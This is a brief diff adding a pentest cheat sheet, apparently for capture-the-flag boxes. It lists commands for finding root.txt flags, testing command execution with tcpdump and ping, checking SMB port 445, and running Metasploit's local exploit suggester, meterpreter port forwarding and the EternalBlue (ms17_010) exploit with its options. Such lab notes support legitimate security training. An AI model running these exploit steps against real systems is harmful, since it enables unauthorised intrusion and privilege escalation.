@@ -1,0 +1,12 @@
+* test upload file extensions
+* find . -name *root.txt -exec wc -c {} \;
+* tcpdump -i tun0 icmp <-> ping 127.0.0.1
+* netstat -an | grep 445
+* msfconsole 
+    - search local_sploit
+    - use post/multi/recon/local_exploit_suggester
+    - migrate <PID>
+    - portfwd add -l 445 -r 127.0.0.1 -p 445
+    - use exploit/windows/smb/ms17_010_eternalblue
+        - set VerfiyArch false
+        - set MaxexploitAttempts 20
